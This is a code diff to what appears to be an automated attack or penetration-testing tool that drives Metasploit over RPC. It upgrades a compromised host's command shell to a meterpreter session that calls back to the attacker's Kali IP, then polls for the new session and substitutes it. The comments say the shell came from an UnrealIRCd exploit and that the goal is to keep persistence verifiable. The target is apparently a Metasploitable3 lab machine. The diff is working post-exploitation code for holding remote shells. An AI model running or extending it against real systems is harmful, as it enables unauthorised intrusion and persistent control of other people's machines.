@@ -1283,6 +1283,119 @@ def _shell_responds(session_id, nonce="__PERSIST_ALIVE_PROBE__") -> bool:
     return nonce in out
 
 
+def _meterpreter_sids() -> set:
+    """Snapshot of ALL meterpreter session ids currently open (best-effort, never raises).
+
+    Used as the "before" baseline for the shell_to_meterpreter upgrade: any meterpreter
+    session that appears AFTER this snapshot (and matches the target) is the upgrade's
+    fruit. Snapshotting all of them — not just the target's — avoids host-matching
+    inconsistencies when a session's host field is blank in session.list.
+    """
+    sids = set()
+    try:
+        sessions = msf_session.client.call("session.list") or {}
+    except Exception:
+        return sids
+    for sid, details in sessions.items():
+        raw_type = details.get(b"type", details.get("type", b""))
+        if isinstance(raw_type, bytes):
+            raw_type = raw_type.decode("utf-8", errors="ignore")
+        if "meterpreter" in raw_type:
+            sids.add(str(sid))
+    return sids
+
+
+def _upgrade_shell_to_meterpreter(target_ip: str, session_id: str,
+                                  lhost: str = None, lport: int = 4455,
+                                  timeout: int = 60):
+    """Upgrade a live command_shell to a meterpreter via post/multi/manage/shell_to_meterpreter.
+
+    Returns the new meterpreter session id (str) on success, or None on failure/timeout
+    (caller then keeps the command_shell). NEVER raises and NEVER hangs (bounded poll).
+
+    Why: the UnrealIRCd cmd/unix/reverse_perl command_shell on MS3 degrades into a
+    read-zombie — listed alive but every shell read returns "(no output)" — which
+    breaks cron-heartbeat verification (B3). A meterpreter session has reliable framed
+    I/O, so upgrading fixes the read reliability the verifier needs.
+
+    Uses the RPC MODULE API (client.modules.use → execute), never the interactive
+    console (tool_metasploit_rpc / send_command wedges into 'sessions -i' mode). The
+    module stands up its own reverse handler (HANDLER defaults True); LHOST is the
+    reverse-reachable attacker IP (KALI_IP) and ReverseListenerBindAddress is already
+    setg 0.0.0.0 globally at console init, so the handler binds inside the container.
+    """
+    lhost = lhost or KALI_IP
+    before = _meterpreter_sids()
+    try:
+        client = msf_session.client
+        mod = client.modules.use("post", "multi/manage/shell_to_meterpreter")
+        try:
+            mod["SESSION"] = int(session_id)
+        except (ValueError, TypeError):
+            mod["SESSION"] = session_id
+        mod["LHOST"] = lhost
+        if lport is not None:
+            try:
+                mod["LPORT"] = int(lport)
+            except Exception:
+                pass
+        print_colored(
+            f"[Persistence Probe] Upgrading command_shell {session_id} -> meterpreter "
+            f"(shell_to_meterpreter LHOST={lhost} LPORT={lport}) — command_shells on "
+            f"this target read-zombie; meterpreter I/O is reliable.",
+            Colors.OKCYAN,
+        )
+        mod.execute()
+    except Exception as e:
+        print_colored(
+            f"[Persistence Probe] shell_to_meterpreter launch failed ({e}) — "
+            f"keeping the command_shell.",
+            Colors.WARNING,
+        )
+        return None
+
+    # Poll session.list for a NEW meterpreter session on the same target (bounded).
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        try:
+            sessions = msf_session.client.call("session.list") or {}
+        except Exception:
+            time.sleep(3)
+            continue
+        for sid, details in sessions.items():
+            sid_str = str(sid)
+            if sid_str in before:
+                continue
+            raw_type = details.get(b"type", details.get("type", b""))
+            if isinstance(raw_type, bytes):
+                raw_type = raw_type.decode("utf-8", errors="ignore")
+            if "meterpreter" not in raw_type:
+                continue
+            host = details.get(b"session_host",
+                    details.get("session_host",
+                    details.get(b"target_host", details.get("target_host", b""))))
+            if isinstance(host, bytes):
+                host = host.decode("utf-8", errors="ignore")
+            # Accept a new meterpreter whose host matches the target, or whose host
+            # field is blank (session.list sometimes omits it right after open).
+            if target_ip and host and host != target_ip:
+                continue
+            print_colored(
+                f"[Persistence Probe] UPGRADE SUCCESS — new meterpreter session {sid_str} "
+                f"on {host or target_ip} (from command_shell {session_id}).",
+                Colors.OKGREEN,
+            )
+            return sid_str
+        time.sleep(3)
+
+    print_colored(
+        f"[Persistence Probe] Upgrade to meterpreter timed out after {timeout}s — "
+        f"falling back to the command_shell.",
+        Colors.WARNING,
+    )
+    return None
+
+
 def _probe_session(target_ip: str, session_id: str, session_type: str):
     """Check that session_id is alive before entering the graph.
 
@@ -1308,24 +1421,44 @@ def _probe_session(target_ip: str, session_id: str, session_type: str):
         if isinstance(stype, bytes):
             stype = stype.decode("utf-8", errors="ignore")
         resolved_type = "meterpreter" if "meterpreter" in stype else "command_shell"
-        # LISTED alive is necessary but NOT sufficient for a command_shell: confirm the
-        # shell actually returns output (not a read-zombie). meterpreter I/O is
-        # reliable, so only gate command_shell.
-        if resolved_type == "command_shell" and not _shell_responds(session_id):
+        if resolved_type == "meterpreter":
             print_colored(
-                f"[Persistence Probe] Session {session_id} is a READ-ZOMBIE "
-                f"(listed alive but the shell returns no output) — searching for a "
-                f"responsive substitute...",
-                Colors.WARNING,
-            )
-            # fall through to the substitute search below (clean abort if none)
-        else:
-            print_colored(
-                f"[Persistence Probe] Session {session_id} is LIVE ({resolved_type}).",
+                f"[Persistence Probe] Session {session_id} is LIVE (meterpreter).",
                 Colors.OKGREEN,
             )
-            # Trust caller's session_type if provided; otherwise use resolved.
-            return session_id, (session_type or resolved_type), "alive"
+            return session_id, (session_type or "meterpreter"), "alive"
+
+        # command_shell path. A reverse_perl command_shell on this target is fragile —
+        # it read-zombies mid-run (listed alive, but every shell READ returns no output),
+        # which breaks cron-heartbeat verification (B3). Try to UPGRADE it to meterpreter
+        # (reliable framed I/O) FIRST, before deciding whether it's usable:
+        #   shell_to_meterpreter is WRITE-driven — it writes a stager to the shell and the
+        #   new meterpreter dials back on its own channel. A read-zombie's WRITE side often
+        #   still reaches the target, so the upgrade can RESCUE a shell whose reads are dead.
+        # Attempting it here (not only on a responsive shell) is what lets B3 recover when
+        # the shell has already zombied by probe time.
+        new_sid = _upgrade_shell_to_meterpreter(target_ip, session_id)
+        if new_sid:
+            return new_sid, "meterpreter", f"upgraded_{session_id}"
+
+        # Upgrade unavailable/failed — fall back: use the command_shell IFF it actually
+        # returns output; otherwise it's a read-zombie we couldn't rescue -> fall through
+        # to the substitute search (clean abort if none).
+        if _shell_responds(session_id):
+            print_colored(
+                f"[Persistence Probe] Session {session_id} is LIVE (command_shell; "
+                f"upgrade unavailable, shell is responsive).",
+                Colors.OKGREEN,
+            )
+            return session_id, (session_type or "command_shell"), "alive"
+
+        print_colored(
+            f"[Persistence Probe] Session {session_id} is a READ-ZOMBIE "
+            f"(listed alive but the shell returns no output, and could not be upgraded) "
+            f"— searching for a responsive substitute...",
+            Colors.WARNING,
+        )
+        # fall through to the substitute search below (clean abort if none)
 
     # Session is dead — try to find a live substitute on the same target.
     print_colored(
@@ -1368,6 +1501,12 @@ def _probe_session(target_ip: str, session_id: str, session_type: str):
             f"({resolved_type}, host={host or 'unknown'}).",
             Colors.OKGREEN,
         )
+        # Same rationale as the primary path: upgrade a responsive command_shell
+        # substitute to meterpreter for reliable I/O; keep the shell if it fails.
+        if resolved_type == "command_shell":
+            new_sid = _upgrade_shell_to_meterpreter(target_ip, sid_str)
+            if new_sid:
+                return new_sid, "meterpreter", f"upgraded_{sid_str}"
         return sid_str, resolved_type, f"substituted_{sid_str}"
 
     return None, None, f"Session {session_id} dead/unresponsive and no live, responsive session to {target_ip} found."
